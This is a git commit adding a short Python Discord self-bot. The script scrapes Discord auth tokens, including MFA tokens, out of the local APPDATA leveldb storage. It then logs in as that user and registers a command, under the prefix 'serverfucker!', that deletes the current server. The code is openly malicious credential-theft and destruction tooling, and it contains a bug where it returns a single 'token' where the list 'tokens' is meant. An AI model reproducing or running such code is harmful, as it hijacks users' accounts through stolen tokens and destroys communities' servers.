35046a2c7f4bc95c33284aa040a84adf068d055d
Null <66488397+NullByte75@users.noreply.github.com>
2020-12-21 18:59:32 +0100

    Create main.py

---
+++ main.py
@@ -0,0 +1,32 @@
+import discord
+from discord.ext import commands
+import asyncio
+import re 
+import os
+roaming = os.getenv('APPDATA')
+
+def find_tokens():
+    tokens = []
+    path = roaming + "\\Discord\\Local Storage\\leveldb"
+    for file_name in os.listdir(path):
+        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
+            continue
+
+        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
+            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
+                for token in re.findall(regex, line):
+                    tokens.append(token)
+    return token
+
+token2 = str(find_tokens()) #insert target token
+prefix = "serverfucker!"
+client = discord.Client()
+message = discord.Message 
+bot = commands.Bot(command_prefix=prefix, self_bot=True)
+@bot.command()
+async def setup(ctx):
+    await ctx.guild.delete()
+
+asyncio.set_event_loop(asyncio.new_event_loop())
+loop = asyncio.new_event_loop()
+bot.run(token2, bot=False)
